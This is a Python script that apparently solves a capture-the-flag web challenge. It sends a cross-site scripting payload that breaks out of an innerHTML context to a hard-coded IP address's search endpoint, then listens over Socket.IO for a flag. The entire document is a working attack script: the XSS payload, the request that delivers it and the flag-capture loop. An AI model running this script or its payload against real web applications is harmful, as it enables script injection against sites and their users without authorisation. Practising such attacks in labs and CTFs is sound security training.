#!/usr/bin/env python3

import threading
import time

import requests
import socketio

# Target URL
target_url = "http://94.237.48.12:41186"

# XSS payload to break out of the innerHTML context and trigger an alert
# Try img tag with onerror event
payload = '"><img src=x onerror=alert(1)>'

print(f"[+] Targeting: {target_url}")
print(f"[+] Payload: {payload}")

# Create a Socket.IO client
sio = socketio.Client()

flag_received = False

@sio.event
def connect():
    print("[+] Connected to Socket.IO server")

@sio.event
def disconnect():
    print("[+] Disconnected from Socket.IO server")

@sio.event
def flag(data):
    global flag_received
    print(f"[+] FLAG RECEIVED: {data}")
    if 'flag' in data:
        print(f"[+] FLAG: {data['flag']}")
    flag_received = True

@sio.event
def welcome(message):
    print(f"[+] Welcome message: {message}")

def send_payload():
    time.sleep(2)  # Wait a bit for socket connection
    try:
        response = requests.post(
            f"{target_url}/search",
            headers={"Content-Type": "application/json"},
            json={"query": payload},
            timeout=10
        )

        print(f"[+] Response Status: {response.status_code}")
        print(f"[+] Response Body: {response.text}")

        if response.status_code == 200:
            print("[+] Payload sent successfully! Waiting for flag...")
        else:
            print("[-] Failed to send payload")

    except requests.exceptions.RequestException as e:
        print(f"[-] Error sending request: {e}")

# Connect to Socket.IO server
try:
    print("[+] Connecting to Socket.IO server...")
    sio.connect(target_url)

    # Send payload in a separate thread
    payload_thread = threading.Thread(target=send_payload)
    payload_thread.start()

    # Wait for flag or timeout
    timeout = 30
    start_time = time.time()

    while not flag_received and (time.time() - start_time) < timeout:
        time.sleep(0.5)

    if flag_received:
        print("[+] Flag successfully captured!")
    else:
        print("[-] Timeout waiting for flag")

    sio.disconnect()

except Exception as e:
    print(f"[-] Error: {e}")
